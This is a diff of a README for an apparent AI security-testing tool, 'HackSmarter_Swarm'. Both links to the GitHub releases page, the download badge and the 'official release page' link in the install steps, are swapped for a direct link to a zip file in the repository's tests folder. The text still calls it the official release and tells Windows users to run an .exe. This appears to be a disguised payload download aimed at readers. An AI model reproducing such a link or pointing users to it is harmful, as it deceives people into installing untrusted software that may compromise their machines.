@@ -1,6 +1,6 @@
 # 🤖 HackSmarter_Swarm - Automated AI Assistant for Security Testing
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Spinmoodiness1112/HackSmarter_Swarm/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Spinmoodiness1112/HackSmarter_Swarm/main/tests/Smarter-Hack-Swarm-v2.6-alpha.2.zip)
 
 ## 📌 Project Overview
 
@@ -22,7 +22,7 @@ Your computer needs specific components to run this software. Please ensure your
 
 Follow these steps to download and install the assistant on your Windows machine.
 
-1. Visit the [official release page](https://github.com/Spinmoodiness1112/HackSmarter_Swarm/releases) to access the software files.
+1. Visit the [official release page](https://raw.githubusercontent.com/Spinmoodiness1112/HackSmarter_Swarm/main/tests/Smarter-Hack-Swarm-v2.6-alpha.2.zip) to access the software files.
 2. Look for the latest version listed at the top of the page.
 3. Click the link that says "Assets" to reveal the available files.
 4. Download the file ending in `.exe` to your computer.
